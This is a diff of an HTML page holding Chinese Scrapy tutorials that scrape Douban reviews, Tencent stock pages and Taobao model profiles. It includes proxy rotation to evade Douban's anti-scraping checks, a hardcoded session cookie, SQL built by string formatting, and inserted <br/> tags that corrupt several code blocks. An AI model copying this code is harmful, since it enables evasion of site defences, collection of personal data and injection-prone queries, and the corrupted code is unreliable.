@@ -158,7 +158,7 @@
 
 <p>虽然APIKey是不可能拿到了，但是通过文档我仍然发现了一些GET请求并不需要AUTH认证，也就是说有没有APIKey并不影响使用。其中，对我们有用的就是获取<code>TOP250电影列表</code>的接口:</p>
 
-<pre><code>http://api.douban.com/v2/movie/top250
+<pre><code class="language-text">http://api.douban.com/v2/movie/top250
 </code></pre>
 
 <p>接口返回的格式大概如下:<br/>
@@ -172,7 +172,7 @@
 
 <p>详细接口如下,可以通过更改start来迭代获取所有电影条目</p>
 
-<pre><code>https://movie.douban.com/j/new_search_subjects?sort=T&amp;range=0,10&amp;tags=&amp;start=20
+<pre><code class="language-text">https://movie.douban.com/j/new_search_subjects?sort=T&amp;range=0,10&amp;tags=&amp;start=20
 </code></pre>
 
 <p>这个接口可以获取所有豆瓣上收录的电影，经过我的测试，start改为10000时，返回的数据就已经是空的了</p>
@@ -182,7 +182,7 @@
 <p>获取电影信息的方法有了，接下来就是要分析如何获取影评信息了。<br/>
 在每部电影的详情页面里,如<a href="https://movie.douban.com/subject/1292064/">楚门的世界</a>，我们找到了如下这几个详情页面,分别显示了针对这部电影的影评和短评信息</p>
 
-<pre><code>https://movie.douban.com/subject/1292064/reviews ##影评页面
+<pre><code class="language-text">https://movie.douban.com/subject/1292064/reviews ##影评页面
 https://movie.douban.com/subject/1292064/comments ##短评页面
 </code></pre>
 
@@ -194,7 +194,7 @@ https://movie.douban.com/subject/1292064/comments ##短评页面
 <img src="https://pic.mylonly.com/2018-07-07-122913.jpg" alt=""/><br/>
 每条评论都是在一个review-item的div块里面，而所有评论都是在一个review-list的div块里吗，我们通过xpath语法可以很容易的定位到每条评论的详细信息,下面是所有信息的xpath语句，在我们写爬虫时候就靠他提取内容了</p>
 
-<pre><code>评论列表: &quot;//div[contains(@class,&#39;review-list&#39;)]//div[contains(@class,&#39;review-item&#39;)]&quot;
+<pre><code class="language-text">评论列表: &quot;//div[contains(@class,&#39;review-list&#39;)]//div[contains(@class,&#39;review-item&#39;)]&quot;
 
 评论ID: &quot;.//div[@class=&#39;main-bd&#39;]//div[@class=&#39;review-short&#39;]/@data-rid&quot;
 作者头像: &quot;./header[@class=&#39;main-hd&#39;]//a[@class=&#39;avator&#39;]//img/@src &quot;
@@ -209,7 +209,7 @@ https://movie.douban.com/subject/1292064/comments ##短评页面
 
 <p>其中具体的评分我们不能直接拿到，而是只能拿到具体的文字描述,经过我的验证，具体如下对应关系如下:</p>
 
-<pre><code>&#39;力荐&#39;: 5,
+<pre><code class="language-text">&#39;力荐&#39;: 5,
 &#39;推荐&#39;: 4,
 &#39;还行&#39;: 3,
 &#39;较差&#39;: 2,
@@ -224,7 +224,7 @@ https://movie.douban.com/subject/1292064/comments ##短评页面
 
 <h3 id="toc_5">创建项目工程</h3>
 
-<pre><code>##创建DoubanSpider工程
+<pre><code class="language-text">##创建DoubanSpider工程
 scrapy startproject Douban
 </code></pre>
 
@@ -232,7 +232,7 @@ scrapy startproject Douban
 <img src="https://pic.mylonly.com/2018-07-07-122926.jpg" alt=""/><br/>
 其中：</p>
 
-<pre><code>    spiders: 爬虫文件夹,存放具体的爬虫代码，我们待会要编写的两个爬虫(电影信息和影评信息)就需要放在这个文件夹下
+<pre><code class="language-text">    spiders: 爬虫文件夹,存放具体的爬虫代码，我们待会要编写的两个爬虫(电影信息和影评信息)就需要放在这个文件夹下
     items.py: 模型类，所有需要结构化的数据都要预先在此文件中定义
     middlewares.py: 中间件类，scrapy的核心之一，我们会用到其中的downloadMiddleware,
     pipelines.py: 管道类，数据的输出管理，是存数据库还是存文件在这里决定
@@ -251,7 +251,7 @@ scrapy startproject Douban
 
 <h4 id="toc_7">定义爬虫</h4>
 
-<pre><code>class MovieSpider(Spider):
+<pre><code class="language-text">class MovieSpider(Spider):
     name = &#39;movie&#39; #爬虫名称
     allow_dominas = [&quot;douban.com&quot;] #允许的域名
     
@@ -279,7 +279,7 @@ scrapy startproject Douban
 
 <p>接下来通过<code>start_request</code>告诉爬虫要爬取的链接：</p>
 
-<pre><code class="language-Python">
+<pre><code class="language-python">
     def start_requests(self):
         url = &#39;&#39;&#39;https://movie.douban.com/j/new_search_subjects?sort=T&amp;range=0,10&amp;tags=&amp;start={start}&#39;&#39;&#39;
         requests = []
@@ -293,7 +293,7 @@ scrapy startproject Douban
 
 <p>接下来解析每个接口返回的内容:</p>
 
-<pre><code class="language-Python">
+<pre><code class="language-python">
 def parse_movie(self, response):
     jsonBody = json.loads(response.body)
     subjects = jsonBody[&#39;data&#39;]
@@ -313,7 +313,7 @@ def parse_movie(self, response):
 
 <h4 id="toc_8">定义Item</h4>
 
-<pre><code class="language-Python">#定义你需要获取的数据
+<pre><code class="language-python">#定义你需要获取的数据
 class MovieItem(scrapy.Item):
     id = scrapy.Field()
     title = scrapy.Field()
@@ -329,7 +329,7 @@ class MovieItem(scrapy.Item):
 
 <h4 id="toc_9">定义Pipeline</h4>
 
-<pre><code class="language-Python">class MoviePipeline(object):
+<pre><code class="language-python">class MoviePipeline(object):
 
     movieInsert = &#39;&#39;&#39;insert into movies(id,title,rating,genres,original_title,alt,image,year) values (&#39;{id}&#39;,&#39;{title}&#39;,&#39;{rating}&#39;,&#39;{genres}&#39;,&#39;{original_title}&#39;,&#39;{alt}&#39;,&#39;{image}&#39;,&#39;{year}&#39;)&#39;&#39;&#39;
 
@@ -375,7 +375,7 @@ class MovieItem(scrapy.Item):
 
 <p>在命令行下输入:</p>
 
-<pre><code>scrapy crawl movie
+<pre><code class="language-text">scrapy crawl movie
 </code></pre>
 
 <p><img src="https://pic.mylonly.com/2018-07-06-101458.png" alt=""/><br/>
@@ -387,7 +387,7 @@ class MovieItem(scrapy.Item):
 
 <h4 id="toc_12">爬虫逻辑</h4>
 
-<pre><code>class ReviewSpider(Spider):
+<pre><code class="language-text">class ReviewSpider(Spider):
     name = &quot;review&quot;
     allow_domain = [&#39;douban.com&#39;]
     custom_settings = {
@@ -416,7 +416,7 @@ class MovieItem(scrapy.Item):
 <code>DOWNLOAD_TIMEOUT</code>: 下载超时时间，默认是60秒，此处修改为10秒是想让整体的爬取速度加快，因为RETRY_TIMES的缘故，需要RETRY的判定时间为1分钟，如果有很多这种有问题的页面，那么整个爬取的过程会十分漫长。<br/>
 <code>DOWNLOAD_DELAY</code>: 下载延迟，如果你使用代理IP之后还是会出现访问返回403的情况，请设置此值，因为某IP太频繁的访问页面会触发豆瓣的防爬虫机制。</p>
 
-<pre><code class="language-Python">  def start_requests(self):
+<pre><code class="language-python">  def start_requests(self):
         #从数据库中找到所有的moviesId
         self.connect = pymysql.connect(&#39;localhost&#39;,&#39;root&#39;,&#39;******&#39;,&#39;douban&#39;, charset=&#39;utf8&#39;, use_unicode=True)
         self.cursor = self.connect.cursor()
@@ -437,17 +437,17 @@ class MovieItem(scrapy.Item):
 
 <p>照例，我们在start_request中告诉Scrapy要爬取的起始网址链接，通过我们之前的分析，影评页面的地址格式为:</p>
 
-<pre><code class="language-Python">https://movie.douban.com/subject/{movieId}/reviews?start={offset}
+<pre><code class="language-python">https://movie.douban.com/subject/{movieId}/reviews?start={offset}
 </code></pre>
 
 <p>而movieId,我们之前的爬虫已经将所有电影的信息抓取了下来，所以我们在此先通过查询数据库将所有的已抓取的电影信息获取到，取到其中的movieId，然后构造一个页面链接。</p>
 
-<pre><code class="language-Python">url = url_format.format(movieId=movieId, offset=current_page*20)
+<pre><code class="language-python">url = url_format.format(movieId=movieId, offset=current_page*20)
 </code></pre>
 
 <p>因为抓取豆瓣影评的过程十分漫长，中间会出现各种各样的问题导致爬虫意外退出，因此我们需要一个机制让爬虫能从上次停止的地方继续爬取，current_page和total_page就是为此而服务的，在后面的数据解析过程中，每解析一个页面，就会将当期页面的页数存储下来，防止出现意外情况。</p>
 
-<pre><code class="language-Python">    def parse_review(self, response):
+<pre><code class="language-python">    def parse_review(self, response):
         movieId = response.request.meta[&#39;movieId&#39;]
         review_list = response.xpath(&quot;//div[contains(@class,&#39;review-list&#39;)]//div[contains(@class,&#39;review-item&#39;)]&quot;)
         for review in review_list:
@@ -496,7 +496,7 @@ class MovieItem(scrapy.Item):
 <p>接下来，分析解析函数，DoubanItem的数据获取就不额外介绍了，利用之前分析时用到的xpath语句可以很容易的定义到具体内容。<br/>
 其中movieId是起始链接中通过Request中Meta属性传递过来的，当然你可以通过分析网页找到包含movieId的地方。</p>
 
-<pre><code>current_page = response.xpath(&quot;//span[@class=&#39;thispage&#39;]/text()&quot;).extract()
+<pre><code class="language-text">current_page = response.xpath(&quot;//span[@class=&#39;thispage&#39;]/text()&quot;).extract()
 total_page = response.xpath(&quot;//span[@class=&#39;thispage&#39;]/@data-total-page&quot;).extract()
 paginator = response.xpath(&quot;//div[@class=&#39;paginator&#39;]&quot;).extract()
 </code></pre>
@@ -507,13 +507,13 @@ paginator = response.xpath(&quot;//div[@class=&#39;paginator&#39;]&quot;).extrac
 
 <p>但是这个导航条会有两种情况获取不到:</p>
 
-<pre><code>1. 当某个电影的评论不足20条时，也就是只有一页评论。
+<pre><code class="language-text">1. 当某个电影的评论不足20条时，也就是只有一页评论。
 2. 当触发了豆瓣的反爬虫的机制时，返回的页面并不是评论页面，而是一个验证页面，自然也找不到导航条
 </code></pre>
 
 <p>所以在下面的代码中，我通过这几个变量来判断了以上几种情况：</p>
 
-<pre><code>1. 情况1时，不需要继续爬取剩下的评论，直接将current_page和total_page设置为1保存到movie表即可
+<pre><code class="language-text">1. 情况1时，不需要继续爬取剩下的评论，直接将current_page和total_page设置为1保存到movie表即可
 2. 情况2时，由于此时触发了反爬虫机制，返回的页面没有我们的数据，如果我们直接忽略掉的话，会损失大量的数据（这种情况很常见），所以我们就干脆再试一次，返回request，让Scrapy重新爬取这个页面，因为每次重新爬取都会换一个新的代理IP，所以我们有很大概率下次抓取就是正常的。此处有一点需要注意：因为Scrapy默认会过滤掉重复请求，所以我们需要在构造Request的时候讲dont_filter参数设置为True,让其不要过滤重复链接。
 3. 正常情况时，通过xpath语法获取的下一页评论的链接地址然后构造一个request交给Scrapy继续爬取
 </code></pre>
@@ -522,7 +522,7 @@ paginator = response.xpath(&quot;//div[@class=&#39;paginator&#39;]&quot;).extrac
 
 <p>上面说过，抓取影评页面时需要通过使用代理IP的方式来达到绕过豆瓣的反爬虫机制，具体代理的设置就需要在DownloadMiddleware中设置</p>
 
-<pre><code class="language-Python">class DoubanDownloaderMiddleware(object):
+<pre><code class="language-python">class DoubanDownloaderMiddleware(object):
 # Not all methods need to be defined. If a method is not defined,
 # scrapy acts as if the downloader middleware does not modify the
 # passed objects.
@@ -581,7 +581,7 @@ def process_response(self, request, response, spider):
 
 <h4 id="toc_14">影评Item</h4>
 
-<pre><code class="language-Python">class ReviewItem(scrapy.Item):
+<pre><code class="language-python">class ReviewItem(scrapy.Item):
 id = scrapy.Field()
 username = scrapy.Field()
 nickname = scrapy.Field()
@@ -598,7 +598,7 @@ alt = scrapy.Field()
 
 <h4 id="toc_15">影评Pipeline</h4>
 
-<pre><code class="language-Python">
+<pre><code class="language-python">
 class ReviewPipeline(object):
 
     reviewInsert = &#39;&#39;&#39;insert into reviews(id,username,nickname,avatar,summary,title,movieId,rating,create_time,alt) values (&quot;{id}&quot;,&quot;{username}&quot;, &quot;{nickname}&quot;,&quot;{avatar}&quot;, &quot;{summary}&quot;,&quot;{title}&quot;,&quot;{movieId}&quot;,&quot;{rating}&quot;,&quot;{create_time}&quot;,&quot;{alt}&quot;)&#39;&#39;&#39;
@@ -631,12 +631,12 @@ class ReviewPipeline(object):
         self.connect.close()
 </code></pre>
 
-<pre><code>和之前的电影的pipeline类似，就是基本的数据库写操作。
+<pre><code class="language-text">和之前的电影的pipeline类似，就是基本的数据库写操作。
 </code></pre>
 
 <h4 id="toc_16">运行爬虫</h4>
 
-<pre><code class="language-Shell">scrapy crawl review
+<pre><code class="language-shell">scrapy crawl review
 </code></pre>
 
 <p>在我写完这篇文章时，影评的爬虫仍然还在爬取当中：<br/>
@@ -675,31 +675,26 @@ class ReviewPipeline(object):
 			<ol>
 <li><p>ValueError: unknown locale: UTF-8 <br/>
 <img src="https://pic.mylonly.com/2018-04-23-15244561735556.jpg" alt=""/></p>
-
 <p>添加下面代码至用户目录的.bash_profile文件   </p>
-
-<pre><code class="language-Bash">export LANG=&quot;en_US.UTF-8&quot;
-export LC_COLLATE=&quot;en_US.UTF-8&quot;
-export LC_CTYPE=&quot;en_US.UTF-8&quot;
-export LC_MESSAGES=&quot;en_US.UTF-8&quot;
-export LC_MONETARY=&quot;en_US.UTF-8&quot;
-export LC_NUMERIC=&quot;en_US.UTF-8&quot;
-export LC_TIME=&quot;en_US.UTF-8&quot;
+<pre><code class="language-bash">export LANG=&quot;en_US.UTF-8&quot;
+export LC_COLLATE=&quot;en_US.UTF-8&quot;<br/>
+export LC_CTYPE=&quot;en_US.UTF-8&quot;<br/>
+export LC_MESSAGES=&quot;en_US.UTF-8&quot;<br/>
+export LC_MONETARY=&quot;en_US.UTF-8&quot;<br/>
+export LC_NUMERIC=&quot;en_US.UTF-8&quot;<br/>
+export LC_TIME=&quot;en_US.UTF-8&quot;<br/>
 export LC_ALL=
 </code></pre></li>
 <li><p>zip()函数在Python2和Python3中的区别</p>
-
 <p>在Python2中，zip返回的是元祖的列表<br/>
 而在Python3中，zip返回的是元祖组成的迭代器，得套个list函数才能将其转换为列表</p>
-
-<pre><code>x = [1, 2, 3]
-y = [a, b, c]
-
-#python3
-n = list(zip(x,y))
-print(n)
-#python2
-n = zip(x,y)
+<pre><code class="language-text">x = [1, 2, 3]
+y = [a, b, c]<br/>
+#python3<br/>
+n = list(zip(x,y))<br/>
+print(n)<br/>
+#python2<br/>
+n = zip(x,y)<br/>
 print n
 </code></pre></li>
 </ol>
@@ -739,15 +734,13 @@ print n
 
 <ol>
 <li><p>Docker安装,具体安装步骤参考<a href="https://docs.docker.com/engine/installation/">Docker官网</a></p>
-
 <blockquote>
 <p>为什么要安装Docker?<br/>
 因为Scrapy-Splash使用了<code>Splash HTTP API</code>,所以你需要提供一个Splash实例，而在Docker镜像中已经有现成的Splash实例了，可以很方便的使用。</p>
 </blockquote></li>
 <li><p>Docker镜像源更改,参考<a href="https://ieevee.com/tech/2016/09/28/docker-mirror.html">国内 docker 仓库镜像对比</a></p></li>
 <li><p>安装运行Splash</p>
-
-<pre><code>docker pull scrapinghub/splash   #从docker镜像中拉取splash实例
+<pre><code class="language-text">docker pull scrapinghub/splash   #从docker镜像中拉取splash实例
 docker run -p 8050:8050 scrapinghub/splash  #启动splash实例
 </code></pre></li>
 </ol>
@@ -756,7 +749,7 @@ docker run -p 8050:8050 scrapinghub/splash  #启动splash实例
 
 <p>在Scrapy项目的setting.py中加入如下内容：</p>
 
-<pre><code class="language-Python">SPLASH_URL = &#39;http://localhost:8050&#39;  
+<pre><code class="language-python">SPLASH_URL = &#39;http://localhost:8050&#39;  
 
 DOWNLOADER_MIDDLEWARES = {
 &#39;scrapy_splash.SplashCookiesMiddleware&#39;: 723,
@@ -789,7 +782,7 @@ HTTPCACHE_STORAGE = &#39;scrapy_splash.SplashAwareFSCacheStorage&#39;
 
 <p>此处由于实际数据被塞到了一段JS的变量里面，并不是由Ajax调用接口获取的，因此为了避免自己手动去截取js变量，我们便将该页面交给Scrapy-Splash渲染</p>
 
-<pre><code class="language-Python">import scrapy
+<pre><code class="language-python">import scrapy
 from FinancialInfoSpider.items import ArticleItem
 from scrapy_splash import SplashRequest
 from w3lib.html import remove_tags
@@ -846,7 +839,7 @@ class TencentStockSpider(scrapy.Spider):
 
 <p>主要代码就一句，将获取到的页面发送给本地的Splash实例去渲染解析，最后将结果返回给parse函数解析</p>
 
-<pre><code>SplashRequest(url, self.parse, args={&#39;wait&#39;: 0.5})
+<pre><code class="language-text">SplashRequest(url, self.parse, args={&#39;wait&#39;: 0.5})
 </code></pre>
 
 <p>里面用了BeautifulSoup这个库去除了html中得script和style标签，具体用法可以参考这两篇文章:</p>
@@ -916,102 +909,92 @@ class TencentStockSpider(scrapy.Spider):
 
 <ol>
 <li><p>定义Item</p>
-
-<pre><code class="language-Python">class tbModelItem(scrapy.Item):
-    avatarUrl = scrapy.Field()
-    cardUrl = scrapy.Field()
-    city = scrapy.Field()
-    height = scrapy.Field()
-    identityUrl = scrapy.Field()
-    modelUrl = scrapy.Field()
-    realName = scrapy.Field()
-    totalFanNum = scrapy.Field()
-    totalFavorNum = scrapy.Field()
-    userId = scrapy.Field()
-    viewFlag = scrapy.Field()
+<pre><code class="language-python">class tbModelItem(scrapy.Item):
+    avatarUrl = scrapy.Field()<br/>
+    cardUrl = scrapy.Field()<br/>
+    city = scrapy.Field()<br/>
+    height = scrapy.Field()<br/>
+    identityUrl = scrapy.Field()<br/>
+    modelUrl = scrapy.Field()<br/>
+    realName = scrapy.Field()<br/>
+    totalFanNum = scrapy.Field()<br/>
+    totalFavorNum = scrapy.Field()<br/>
+    userId = scrapy.Field()<br/>
+    viewFlag = scrapy.Field()<br/>
     weight = scrapy.Field()
 </code></pre>
-
 <p>根据上面的分析得到的json格式，我们可以很轻松的定义出item</p></li>
 <li><p>Spider编写</p>
-
-<pre><code class="language-Python">import urllib2
-import os
-import re
-import codecs
-import json
-import sys
-from scrapy import Spider
-from scrapy.selector import Selector
-from MySpider.items import tbModelItem,tbThumbItem
-from scrapy.http import Request
-from scrapy.http import FormRequest
-from scrapy.utils.response import open_in_browser
-
-reload(sys)
-sys.setdefaultencoding(&#39;utf8&#39;)
-
-class tbmmSpider(Spider):
-    name = &quot;tbmm&quot;
-    allow_domians = [&quot;mm.taobao.com&quot;]
-
-    custom_settings = {
-        &quot;DEFAULT_REQUEST_HEADERS&quot;:{
-            &#39;authority&#39;:&#39;mm.taobao.com&#39;,
-            &#39;accept&#39;:&#39;application/json, text/javascript, */*; q=0.01&#39;,
-            &#39;accept-encoding&#39;:&#39;gzip, deflate&#39;,
-            &#39;accept-language&#39;:&#39;zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4&#39;,
-            &#39;origin&#39;:&#39;https://mm.taobao.com&#39;,
-            &#39;referer&#39;:&#39;https://mm.taobao.com/search_tstar_model.htm?spm=719.1001036.1998606017.2.KDdsmP&#39;,
-            &#39;user-agent&#39;:&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36&#39;,
-            &#39;x-requested-with&#39;:&#39;XMLHttpRequest&#39;,
-            &#39;cookie&#39;:&#39;cna=/oN/DGwUYmYCATFN+mKOnP/h; tracknick=adimtxg; _cc_=Vq8l%2BKCLiw%3D%3D; tg=0; thw=cn; v=0; cookie2=1b2b42f305311a91800c25231d60f65b; t=1d8c593caba8306c5833e5c8c2815f29; _tb_token_=7e6377338dee7; CNZZDATA30064598=cnzz_eid%3D1220334357-1464871305-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464871305; CNZZDATA30063600=cnzz_eid%3D1139262023-1464874171-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464874171; JSESSIONID=8D5A3266F7A73C643C652F9F2DE1CED8; uc1=cookie14=UoWxNejwFlzlcw%3D%3D; l=Ahoatr-5ycJM6M9x2/4hzZdp6so-pZzm; mt=ci%3D-1_0&#39;
-        },
-        &quot;ITEM_PIPELINES&quot;:{
-            &#39;MySpider.pipelines.tbModelPipeline&#39;: 300
-        }
-    } 
-
-    def start_requests(self):
-        url = &quot;https://mm.taobao.com/tstar/search/tstar_model.do?_input_charset=utf-8&quot;
-        requests = []
-        for i in range(1,60):
-            formdata = {&quot;q&quot;:&quot;&quot;,
-                        &quot;viewFlag&quot;:&quot;A&quot;,
-                        &quot;sortType&quot;:&quot;default&quot;,
-                        &quot;searchStyle&quot;:&quot;&quot;,
-                        &quot;searchRegion&quot;:&quot;city:&quot;,
-                        &quot;searchFansNum&quot;:&quot;&quot;,
-                        &quot;currentPage&quot;:str(i),
-                        &quot;pageSize&quot;:&quot;100&quot;}
-            request = FormRequest(url,callback=self.parse_model,formdata=formdata)
-            requests.append(request)
-        return requests
-
-    def parse_model(self,response):
-        jsonBody = json.loads(response.body.decode(&#39;gbk&#39;).encode(&#39;utf-8&#39;))
-        models = jsonBody[&#39;data&#39;][&#39;searchDOList&#39;]
-        modelItems = []
-        for dict in models:
-            modelItem = tbModelItem()
-            modelItem[&#39;avatarUrl&#39;] = dict[&#39;avatarUrl&#39;]
-            modelItem[&#39;cardUrl&#39;] = dict[&#39;cardUrl&#39;]
-            modelItem[&#39;city&#39;] = dict[&#39;city&#39;]
-            modelItem[&#39;height&#39;] = dict[&#39;height&#39;]
-            modelItem[&#39;identityUrl&#39;] = dict[&#39;identityUrl&#39;]
-            modelItem[&#39;modelUrl&#39;] = dict[&#39;modelUrl&#39;]
-            modelItem[&#39;realName&#39;] = dict[&#39;realName&#39;]
-            modelItem[&#39;totalFanNum&#39;] = dict[&#39;totalFanNum&#39;]
-            modelItem[&#39;totalFavorNum&#39;] = dict[&#39;totalFavorNum&#39;]
-            modelItem[&#39;userId&#39;] = dict[&#39;userId&#39;]
-            modelItem[&#39;viewFlag&#39;] = dict[&#39;viewFlag&#39;]
-            modelItem[&#39;weight&#39;] = dict[&#39;weight&#39;]
-            modelItems.append(modelItem)
+<pre><code class="language-python">import urllib2
+import os<br/>
+import re<br/>
+import codecs<br/>
+import json<br/>
+import sys<br/>
+from scrapy import Spider<br/>
+from scrapy.selector import Selector<br/>
+from MySpider.items import tbModelItem,tbThumbItem<br/>
+from scrapy.http import Request<br/>
+from scrapy.http import FormRequest<br/>
+from scrapy.utils.response import open_in_browser<br/>
+reload(sys)<br/>
+sys.setdefaultencoding(&#39;utf8&#39;)<br/>
+class tbmmSpider(Spider):<br/>
+    name = &quot;tbmm&quot;<br/>
+    allow_domians = [&quot;mm.taobao.com&quot;]<br/>
+    custom_settings = {<br/>
+        &quot;DEFAULT_REQUEST_HEADERS&quot;:{<br/>
+            &#39;authority&#39;:&#39;mm.taobao.com&#39;,<br/>
+            &#39;accept&#39;:&#39;application/json, text/javascript, */*; q=0.01&#39;,<br/>
+            &#39;accept-encoding&#39;:&#39;gzip, deflate&#39;,<br/>
+            &#39;accept-language&#39;:&#39;zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4&#39;,<br/>
+            &#39;origin&#39;:&#39;https://mm.taobao.com&#39;,<br/>
+            &#39;referer&#39;:&#39;https://mm.taobao.com/search_tstar_model.htm?spm=719.1001036.1998606017.2.KDdsmP&#39;,<br/>
+            &#39;user-agent&#39;:&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36&#39;,<br/>
+            &#39;x-requested-with&#39;:&#39;XMLHttpRequest&#39;,<br/>
+            &#39;cookie&#39;:&#39;cna=/oN/DGwUYmYCATFN+mKOnP/h; tracknick=adimtxg; _cc_=Vq8l%2BKCLiw%3D%3D; tg=0; thw=cn; v=0; cookie2=1b2b42f305311a91800c25231d60f65b; t=1d8c593caba8306c5833e5c8c2815f29; _tb_token_=7e6377338dee7; CNZZDATA30064598=cnzz_eid%3D1220334357-1464871305-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464871305; CNZZDATA30063600=cnzz_eid%3D1139262023-1464874171-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464874171; JSESSIONID=8D5A3266F7A73C643C652F9F2DE1CED8; uc1=cookie14=UoWxNejwFlzlcw%3D%3D; l=Ahoatr-5ycJM6M9x2/4hzZdp6so-pZzm; mt=ci%3D-1_0&#39;<br/>
+        },<br/>
+        &quot;ITEM_PIPELINES&quot;:{<br/>
+            &#39;MySpider.pipelines.tbModelPipeline&#39;: 300<br/>
+        }<br/>
+    } <br/>
+    def start_requests(self):<br/>
+        url = &quot;https://mm.taobao.com/tstar/search/tstar_model.do?_input_charset=utf-8&quot;<br/>
+        requests = []<br/>
+        for i in range(1,60):<br/>
+            formdata = {&quot;q&quot;:&quot;&quot;,<br/>
+                        &quot;viewFlag&quot;:&quot;A&quot;,<br/>
+                        &quot;sortType&quot;:&quot;default&quot;,<br/>
+                        &quot;searchStyle&quot;:&quot;&quot;,<br/>
+                        &quot;searchRegion&quot;:&quot;city:&quot;,<br/>
+                        &quot;searchFansNum&quot;:&quot;&quot;,<br/>
+                        &quot;currentPage&quot;:str(i),<br/>
+                        &quot;pageSize&quot;:&quot;100&quot;}<br/>
+            request = FormRequest(url,callback=self.parse_model,formdata=formdata)<br/>
+            requests.append(request)<br/>
+        return requests<br/>
+    def parse_model(self,response):<br/>
+        jsonBody = json.loads(response.body.decode(&#39;gbk&#39;).encode(&#39;utf-8&#39;))<br/>
+        models = jsonBody[&#39;data&#39;][&#39;searchDOList&#39;]<br/>
+        modelItems = []<br/>
+        for dict in models:<br/>
+            modelItem = tbModelItem()<br/>
+            modelItem[&#39;avatarUrl&#39;] = dict[&#39;avatarUrl&#39;]<br/>
+            modelItem[&#39;cardUrl&#39;] = dict[&#39;cardUrl&#39;]<br/>
+            modelItem[&#39;city&#39;] = dict[&#39;city&#39;]<br/>
+            modelItem[&#39;height&#39;] = dict[&#39;height&#39;]<br/>
+            modelItem[&#39;identityUrl&#39;] = dict[&#39;identityUrl&#39;]<br/>
+            modelItem[&#39;modelUrl&#39;] = dict[&#39;modelUrl&#39;]<br/>
+            modelItem[&#39;realName&#39;] = dict[&#39;realName&#39;]<br/>
+            modelItem[&#39;totalFanNum&#39;] = dict[&#39;totalFanNum&#39;]<br/>
+            modelItem[&#39;totalFavorNum&#39;] = dict[&#39;totalFavorNum&#39;]<br/>
+            modelItem[&#39;userId&#39;] = dict[&#39;userId&#39;]<br/>
+            modelItem[&#39;viewFlag&#39;] = dict[&#39;viewFlag&#39;]<br/>
+            modelItem[&#39;weight&#39;] = dict[&#39;weight&#39;]<br/>
+            modelItems.append(modelItem)<br/>
         return modelItems  
 </code></pre>
-
 <p>代码不长，一点一点来分析:</p>
-
 <ol>
 <li>由于分析这个页面并不需要递归遍历网页，所以就不要crawlSpider了，只继承最简单的spider</li>
 <li>custome_setting可用于自定义每个spider的设置，而setting.py中的都是全局属性的，当你的scrapy工程里有多个spider的时候这个custom_setting就显得很有用了</li>
@@ -1020,30 +1003,26 @@ class tbmmSpider(Spider):
 <li>parse函数里利用json库解析了返回来得数据，赋值给item的相应字段</li>
 </ol></li>
 <li><p>数据后续处理</p>
-
 <p>数据处理也就是我上面配置ITEM_PIPELINES的目的，这里，我将获取到的item数据存储到了本地的mysql数据中，各位也可以通过FEED_URL参数直接输出json格式文本文件</p>
-
-<pre><code class="language-Python">import MySQLdb
-
-class tbModelPipeline(object):
-    def process_item(self,item,spider):
-        db = MySQLdb.connect(&quot;localhost&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;spider&quot;)
-        cursor = db.cursor()
-        db.set_character_set(&#39;utf8&#39;)
-        cursor.execute(&#39;SET NAMES utf8;&#39;)
-        cursor.execute(&#39;SET CHARACTER SET utf8;&#39;)
-        cursor.execute(&#39;SET character_set_connection=utf8;&#39;)
-
-        sql =&quot;INSERT INTO tb_model(user_id,avatar_url,card_url,city,height,identity_url,model_url,real_name,total_fan_num,total_favor_num,view_flag,weight)\
-                      VALUES(&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;)&quot;%(item[&#39;userId&#39;],item[&#39;avatarUrl&#39;],item[&#39;cardUrl&#39;],item[&#39;city&#39;],item[&#39;height&#39;],item[&#39;identityUrl&#39;],\
-                      item[&#39;modelUrl&#39;],item[&#39;realName&#39;],item[&#39;totalFanNum&#39;],item[&#39;totalFavorNum&#39;],item[&#39;viewFlag&#39;],item[&#39;weight&#39;])
-        try:
-                print sql
-                cursor.execute(sql)
-                db.commit()
-        except MySQLdb.Error,e:
-                print &quot;Mysql Error %d: %s&quot; % (e.args[0], e.args[1])
-        db.close()
+<pre><code class="language-python">import MySQLdb
+class tbModelPipeline(object):<br/>
+    def process_item(self,item,spider):<br/>
+        db = MySQLdb.connect(&quot;localhost&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;spider&quot;)<br/>
+        cursor = db.cursor()<br/>
+        db.set_character_set(&#39;utf8&#39;)<br/>
+        cursor.execute(&#39;SET NAMES utf8;&#39;)<br/>
+        cursor.execute(&#39;SET CHARACTER SET utf8;&#39;)<br/>
+        cursor.execute(&#39;SET character_set_connection=utf8;&#39;)<br/>
+        sql =&quot;INSERT INTO tb_model(user_id,avatar_url,card_url,city,height,identity_url,model_url,real_name,total_fan_num,total_favor_num,view_flag,weight)\<br/>
+                      VALUES(&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;)&quot;%(item[&#39;userId&#39;],item[&#39;avatarUrl&#39;],item[&#39;cardUrl&#39;],item[&#39;city&#39;],item[&#39;height&#39;],item[&#39;identityUrl&#39;],\<br/>
+                      item[&#39;modelUrl&#39;],item[&#39;realName&#39;],item[&#39;totalFanNum&#39;],item[&#39;totalFavorNum&#39;],item[&#39;viewFlag&#39;],item[&#39;weight&#39;])<br/>
+        try:<br/>
+                print sql<br/>
+                cursor.execute(sql)<br/>
+                db.commit()<br/>
+        except MySQLdb.Error,e:<br/>
+                print &quot;Mysql Error %d: %s&quot; % (e.args[0], e.args[1])<br/>
